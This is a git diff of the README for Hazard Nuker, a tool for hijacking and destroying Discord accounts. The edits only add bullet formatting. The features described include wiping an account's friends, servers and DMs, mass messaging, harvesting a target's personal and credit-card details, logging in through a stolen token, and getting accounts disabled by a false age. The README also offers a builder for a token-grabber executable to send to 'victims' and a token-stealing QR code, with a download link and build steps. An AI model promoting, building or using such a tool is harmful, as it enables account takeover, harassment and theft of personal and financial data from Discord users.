@@ -56,23 +56,23 @@ code ✅
 * Everything will be logged and you can watch what happens on the cmd
 
 #### [2] Unfriend all friends
-removes all friend the user has
+* removes all friend the user has
 
 #### [3] delete and leave all servers
-Leaves and deletes all the server the user has
+* Leaves and deletes all the server the user has
 
 #### [4] Spam Create New servers
-Creates 100 new servers named whatever you want
+* Creates 100 new servers named whatever you want
 
 #### [5] DM Deleter
-Deletes all the private DM's the account has
+* Deletes all the private DM's the account has
 
 #### [5] Mass DM
-Messages all friends and group chats a message of your choice 
+* Messages all friends and group chats a message of your choice 
 
 #### [7] Enable seizure mode
-Switches between Light/dark mode as long as the console is open
-also switches languages from ja to zh-TW to ko to zh-CN
+* Switches between Light/dark mode as long as the console is open
+* also switches languages from ja to zh-TW to ko to zh-CN
 
 #### [8] Get information from a targetted account
 This is the info you get:
@@ -104,16 +104,16 @@ This is the info you get:
 * if they have multiple credit cards connected you get those aswell
 
 #### [9] Log into an account
-Log into the account via their token
-Make sure you have the correct Chromedriver.exe get it [here](https://chromedriver.chromium.org/downloads)
-download the version corresponding to your chrome browsers version [How to get google version](https://www.businessinsider.com/what-version-of-google-chrome-do-i-have?op=1&r=US&IR=T)
+* Log into the account via their token
+* Make sure you have the correct Chromedriver.exe get it [here](https://chromedriver.chromium.org/downloads)
+* download the version corresponding to your chrome browsers version [How to get google version](https://www.businessinsider.com/what-version-of-google-chrome-do-i-have?op=1&r=US&IR=T)
 
 #### [10] Disable Account
-changes their age to below 13 which is against Tos and leads to their acc to being disabled
+* changes their age to below 13 which is against Tos and leads to their acc to being disabled
 
 #### [11] Status Changer
-Changes their status
-Made this mainly if your lazy like me since you can just log into their account and change their status.
+* Changes their status
+* Made this mainly if your lazy like me since you can just log into their account and change their status.
 
 #### [12] Create Token Grabber
 Creates a token grabber in exe form that you can send to your victims and get their info thru a webhook
@@ -162,19 +162,19 @@ Upon running the file you will get the following sent to your webhook:
 <p align="left"><img src="https://i.imgur.com/4KmwB6I.png"</p>
 
 #### [14] QR Code Grabber
-Creates a QR code that will give you a discord user's token if they scan it
+* Creates a QR code that will give you a discord user's token if they scan it
 
 #### [15] Mass Report
-Mass report a user of your choice
-The account that will send the reports are the token that you put in
+* Mass report a user of your choice
+* The account that will send the reports are the token that you put in
 
 #### [16] Webhook Destroyer
-Choose between deleting or spamming a webhook
-Can customize the Duration of spam and the message being sent
+* Choose between deleting or spamming a webhook
+* Can customize the Duration of spam and the message being sent
 
 #### [17] Exit
-Exit the program
-(press y to confirm exiting)
+* Exit the program
+> (press y to confirm exiting)
 
 ### ❗・Important
 * Make sure to have [Python](https://www.python.org/downloads/) before [Downloading](https://github.com/Rdimo/Hazard-Nuker/archive/refs/heads/master.zip) Hazard
@@ -204,9 +204,6 @@ Open HazardNuker.exe
 
 pyinstaller is not recognized as an external command
 > open a cmd and type `pip install pyinstaller` or make sure [python](https://www.python.org/downloads/) is added to [PATH](https://datatofish.com/add-python-to-windows-path/)
-
-no module named psutil
-> open a cmd and type `pip install psutil`
 
 Errors like these:
 <p align="left">
